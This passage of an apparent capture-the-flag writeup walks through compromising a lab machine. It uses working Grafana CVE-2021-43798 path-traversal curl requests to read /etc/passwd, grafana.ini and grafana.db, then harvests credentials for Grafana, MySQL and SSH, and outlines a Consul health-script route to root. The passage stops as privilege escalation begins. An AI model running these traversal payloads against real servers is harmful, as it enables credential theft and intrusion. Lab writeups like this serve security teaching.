src="img/pasted-image-20251116000120.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116000120.png" src="img/pasted-image-20251116000120.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By using <code>whatweb</code> and <code>wappalyzer</code>, we were able to identify the technologies running on the specified <code>HTTP</code> services. The most relevant information was retrieved from the web service hosted on port <code>3000</code>, which indicated the <code>Grafana</code> version, specifically <code>v8.2.0</code>. This information can be used to search for associated vulnerabilities. The enumeration of the web services will then continue.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80 &amp; 3000: Source Code Inspection" dir="auto" class="heading" id="TCP_Port_80_&amp;_3000_Source_Code_Inspection_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80 &amp; 3000: Source Code Inspection</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115174015.png" src="img/pasted-image-20251115174015.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115174015.png" src="img/pasted-image-20251115174015.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116000827.png" src="img/pasted-image-20251116000827.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116000827.png" src="img/pasted-image-20251116000827.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The source code of both web services did not contain any relevant information, so a route and resource discovery scan will be performed next.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80 &amp; 3000: Discovering Routes and Resources Using `dirsearch`" dir="auto" class="heading" id="TCP_Port_80_&amp;_3000_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80 &amp; 3000: Discovering Routes and Resources Using <code>dirsearch</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">dirsearch <span class="token parameter variable">-u</span> http://10.10.11.183/ --exclude-status<span class="token operator">=</span><span class="token number">403,404</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115174312.png" src="img/pasted-image-20251115174312.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115174312.png" src="img/pasted-image-20251115174312.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">dirsearch <span class="token parameter variable">-u</span> http://10.10.11.183:3000/ --exclude-status<span class="token operator">=</span><span class="token number">403,404</span>,401
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116003434.png" src="img/pasted-image-20251116003434.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116003434.png" src="img/pasted-image-20251116003434.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the scans conclude, many <code>paths</code> and <code>resources</code> are found. Then these resources will be downloaded to filter them by some keywords in an attempt to discover sensitive information.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">wget</span> http://10.10.11.183/ <span class="token parameter variable">-r</span> <span class="token operator">&amp;&gt;</span>/dev/null
<span class="token function">wget</span> http://10.10.11.183:3000/ <span class="token parameter variable">-r</span> <span class="token operator">&amp;&gt;</span>/dev/null
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116003830.png" src="img/pasted-image-20251116003830.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116003830.png" src="img/pasted-image-20251116003830.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the resources of both web services were downloaded, the search filtered by some keywords will then be performed:</p></div><div class="el-pre"><pre><code data-line="0">grep -riE 'dbpass|creds|password|ambassador|pass|user' --text . | grep -v '/10.10.11.183:3000/index.html' | cat -l py
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116003936.png" src="img/pasted-image-20251116003936.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116003936.png" src="img/pasted-image-20251116003936.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Only one line contained interesting information, which indicated that there is probably a system user called <code>developer</code>. It stated that this user would receive a password when connecting to the target machine via <code>SSH</code>. This information could be used to <code>brute‑force</code> the user's <code>SSH</code> session using tools like <code>Hydra</code>, but before the web services will continue being enumerated:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80 &amp; 3000: Web Enumeration" dir="auto" class="heading" id="TCP_Port_80_&amp;_3000_Web_Enumeration_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80 &amp; 3000: Web Enumeration</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116003539.png" src="img/pasted-image-20251116003539.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116003539.png" src="img/pasted-image-20251116003539.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116003614.png" src="img/pasted-image-20251116003614.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116003614.png" src="img/pasted-image-20251116003614.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The web services were lightly enumerated. For the first one, only the route containing the previously discovered message was found, and for the other web service the typical <code>Grafana</code> credentials such as <code>admin:admin</code> were tests but they did not worked. They were not enumerated further because having the <code>Grafana</code> version, which is <code>v8.2.0</code>, was valuable information to begin the vulnerability identification, as follows:</p></div><div class="el-h2"><h2 data-heading="TCP Port 3000: Identifying Vulnerabilities for Grafana v8.2.0 Using `searchsploit`" dir="auto" class="heading" id="TCP_Port_3000_Identifying_Vulnerabilities_for_Grafana_v8.2.0_Using_`searchsploit`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 3000: Identifying Vulnerabilities for Grafana v8.2.0 Using <code>searchsploit</code></h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115175930.png" src="img/pasted-image-20251115175930.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115175930.png" src="img/pasted-image-20251115175930.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">One vulnerability related to <code>Arbitrary File Read</code> for <code>Grafana</code> version <code>v8.3.0</code> was discovered. Even though it is not for version <code>8.2.0</code>, since that version is older, the vulnerability could also apply. Next, the associated exploit will be inspected to determine how the vulnerability is exploited:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115180227.png" src="img/pasted-image-20251115180227.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115180227.png" src="img/pasted-image-20251115180227.png" target="_self"></span><br>
<span alt="Pasted image 20251115180243.png" src="img/pasted-image-20251115180243.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115180243.png" src="img/pasted-image-20251115180243.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">It can be seen that for the path <code>/public/plugins</code>, which is apparently accessible to anyone, the <code>exploit</code> performs an iteration over potentially existing plugins, and if a plugin exists it can be used to point to local files on the target machine using a <code>path‑traversal</code> technique. Therefore, instead of executing the <code>exploit</code>, it will be exploited manually as follows:</p></div><div class="el-h1"><h1 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h1></div><div class="el-h2"><h2 data-heading="TCP Port 3000: Grafana v8.2.0 - Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)" dir="auto" class="heading" id="TCP_Port_3000_Grafana_v8.2.0_-_Unauthorized_Arbitrary_File_Read_Vulnerability_(CVE-2021-43798)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 3000: Grafana v8.2.0 - Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd'</span> --path-as-is
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115180314.png" src="img/pasted-image-20251115180314.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115180314.png" src="img/pasted-image-20251115180314.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Using the first <code>plugin</code> considered in the <code>exploit</code> (<code>alertlist</code>) and going back several directories to attempt to point to <code>/etc/passwd</code>, the exploitation worked and the file was displayed, which indicated that only the users <code>root</code> and <code>developer</code> had an interactive <code>shell</code> associated. Having confirmed this vulnerability and knowing that the web application running is <code>Grafana</code>, the exploitation can be leveraged to access sensitive <code>Grafana</code> files that could contain credentials or other sensitive information. When a search was made to determine whether there was a file containing the <code>Grafana</code> authentication configuration, it was discovered that one exists at <code>/etc/grafana/grafana.ini</code>, so an attempt will be made to access it:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini'</span> --path-as-is <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'#'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'admin|pass'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115180958.png" src="img/pasted-image-20251115180958.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115180958.png" src="img/pasted-image-20251115180958.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Effectively the file existed and indicated the credentials: <code>admin:messageInABottle685427</code>, this credentials will be tested to log in grafana:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115181047.png" src="img/pasted-image-20251115181047.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115181047.png" src="img/pasted-image-20251115181047.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115181140.png" src="img/pasted-image-20251115181140.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115181140.png" src="img/pasted-image-20251115181140.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The credentials worked and it was possible to log in to the <code>Grafana</code> web application. Once inside, authenticated <code>Grafana</code> vulnerabilities such as <code>code injection</code> or similar were searched for, and the following <code>CVE</code> was found: <a data-tooltip-position="top" aria-label="https://www.sonicwall.com/blog/command-injection-and-local-file-inclusion-in-grafana-cve-2024-9264" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.sonicwall.com/blog/command-injection-and-local-file-inclusion-in-grafana-cve-2024-9264" target="_self">CVE-2024-9264</a>. To exploit this vulnerability, it is necessary for the target machine to have the <code>duckdb</code> binary installed, since the potential vector involves creating a <code>Grafana dashboard</code> and injecting a malicious <code>SQL</code> query that executes commands. However, in this case the system does not have the <code>duckdb</code> binary installed. Instead of attempting this exploitation, more <code>Grafana</code> sensitive files were searched for and one was found at <code>/var/lib/grafana/grafana.db</code>, so next an attempt will be made to retrieve this file:</p></div><div class="el-h2"><h2 data-heading="TCP Port 3000: Enumerating a Grafana Sqlite3 File - `/var/lib/grafana/grafana.db`" dir="auto" class="heading" id="TCP_Port_3000_Enumerating_a_Grafana_Sqlite3_File_-_`/var/lib/grafana/grafana.db`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 3000: Enumerating a Grafana Sqlite3 File - <code>/var/lib/grafana/grafana.db</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token string">'http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db'</span> --path-as-is <span class="token operator">&gt;</span> grafana.db
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202140.png" src="img/pasted-image-20251115202140.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202140.png" src="img/pasted-image-20251115202140.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The file was successfully retrieved and opened using <code>sqlite3</code>. Then the tables were listed, and in the <code>data_source</code> table a potential password was found: <code>dontStandSoCloseToMe632221!</code>. Looking back, port <code>3306 (MySQL)</code> was open, and the mentioned table referenced <code>mysql</code>, so the password could work to access the <code>MySQL</code> databases. Before testing this, another way to obtain this password will be shown:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> GET http://10.10.11.183:3000/api/datasources <span class="token parameter variable">-u</span> admin:messageInABottle685427
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115184140.png" src="img/pasted-image-20251115184140.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115184140.png" src="img/pasted-image-20251115184140.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Executing the command shown in the image, the password for the <code>MySQL</code> database was also obtained. This worked because the credentials used were for the <code>administrator</code>, and this user is authorized to retrieve all the data for the <code>datasources</code> linked to <code>Grafana</code>, in this case a <code>MySQL</code> database. Finally, the credentials were used to authenticate through the <code>MySQL</code> service and they worked, so the <code>databases</code> will be enumerated as follows.</p></div><div class="el-h2"><h2 data-heading="TCP Port 3306: MySQL Enumeration" dir="auto" class="heading" id="TCP_Port_3306_MySQL_Enumeration_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 3306: MySQL Enumeration</h2></div><div class="el-pre"><pre class="language-mysql"><code data-line="0" class="language-mysql is-loaded">show databases;
use whackywidget;
show tables;
select * from users;
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115201432.png" src="img/pasted-image-20251115201432.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115201432.png" src="img/pasted-image-20251115201432.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">For the <code>whackywidget</code> database, there was a table called <code>users</code> which contained the credentials for the user <code>developer</code>, apparently encoded in <code>base64</code>. Therefore, an attempt will be made to decode it.</p></div><div class="el-h2"><h2 data-heading="Base64‑Encoded Password Decoding" dir="auto" class="heading" id="Base64‑Encoded_Password_Decoding_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Base64‑Encoded Password Decoding</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202211.png" src="img/pasted-image-20251115202211.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202211.png" src="img/pasted-image-20251115202211.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The password was indeed <code>base64</code> and was easily decoded. Next, it will be used to attempt authentication through the <code>SSH</code> service as the user <code>developer</code>:</p></div><div class="el-h2"><h2 data-heading="TCP Port 22: SSH Initial Access" dir="auto" class="heading" id="TCP_Port_22_SSH_Initial_Access_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 22: SSH Initial Access</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202256.png" src="img/pasted-image-20251115202256.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202256.png" src="img/pasted-image-20251115202256.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The credentials worked and an interactive <code>SSH</code> session was obtained as the user <code>developer</code>. The <code>post‑exploitation</code> stage will now begin, where the system will be enumerated to find potential vectors to escalate privileges and reach the <code>root</code> account. Before that, the <code>user flag</code> will be shown.</p></div><div class="el-h1"><h1 data-heading="Post-Exploitation" dir="auto" class="heading" id="Post-Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation</h1></div><div class="el-h2"><h2 data-heading="User Flag" dir="auto" class="heading" id="User_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202449.png" src="img/pasted-image-20251115202449.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202449.png" src="img/pasted-image-20251115202449.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the user flag was successfully displayed, then the personal home folder for the user developer will be enumerated</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">ls</span><span class="token operator">=</span><span class="token string">'ls -la'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202430.png" src="img/pasted-image-20251115202430.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202430.png" src="img/pasted-image-20251115202430.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the <code>/home/developer</code> folder was enumerated, including hidden resources, a <code>.gitignore</code> file was found which referenced the path <code>/opt/my-app</code>. Let's check what it contains:</p></div><div class="el-h2"><h2 data-heading="Git Enumeration" dir="auto" class="heading" id="Git_Enumeration_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Git Enumeration</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--add</span> safe.directory /opt/my-app/.git
<span class="token function">git</span> log
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115202733.png" src="img/pasted-image-20251115202733.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115202733.png" src="img/pasted-image-20251115202733.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The directory was a <code>git</code> project with the typical structure. The <code>.git</code> folder was accessed and, once inside it, the <code>git log</code> command was executed to list all the commits made in the project. Then the first two commits will be displayed:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">git</span> show 33a53
<span class="token function">git</span> show c982db
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115203028.png" src="img/pasted-image-20251115203028.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115203028.png" src="img/pasted-image-20251115203028.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>git logs</code> showed an interesting value, specifically a <code>token</code> used for something called <code>consul</code>. When a search was performed to understand what <code>Consul</code> is and whether it could be leveraged to <code>escalate privileges</code>, the following was found: <code>Consul</code> is a <code>HashiCorp</code> platform that provides service discovery, health checks, distributed configuration, and service‑to‑service networking in modern infrastructures. One of its features is that it uses <code>HCL</code> files to define services and checks, some of which can trigger local <code>scripts</code> and execute commands. This is where the exploitation vector comes into play. Having discovered the <code>CONSUL_HTTP_TOKEN</code> in a <code>git commit</code>, the attacker could perform administrative actions, such as forcing a <code>Consul reload</code>. When this restart is performed, <code>Consul</code> loads all the <code>health check scripts (hcl)</code> from the <code>/etc/consul.d/config.d</code> path. If this path has <code>write permissions</code> to create a malicious <code>HCL script</code>, and if <code>Consul</code> runs as <code>root</code>, then when the restart is performed, the <code>script</code> will run as <code>root</code> and execute the specified command.</p></div><div class="el-p"><p dir="auto">Knowing the exploitation vector, the next step will be to determine the two requirements, which are: <code>Consul</code> running as the <code>root</code> user, and <code>/etc/consul.d/config.d</code> having <code>write permissions</code>:</p></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="Hashicorp Consul Exploitation – Forcing Consul Reload to Execute Code Injection in Health Scripts (`.hcl`)" dir="auto" class="heading" id="Hashicorp_Consul_Exploitation_–_Forcing_Consul_Reload_to_Execute_Code_Injection_in_Health_Scripts_(`.hcl`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Hashicorp Consul Exploitation – Forcing Consul Reload to Execute Code Injection in Health Scripts (<code>.hcl</code>)</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ps</span> <span class="token parameter variable">-faux</span> <span class="token operator">|</span> <span class="token function">grep</span> consul
<span class="token function">ls</span> <span class="token parameter variable">-l</span> /etc/consul.d
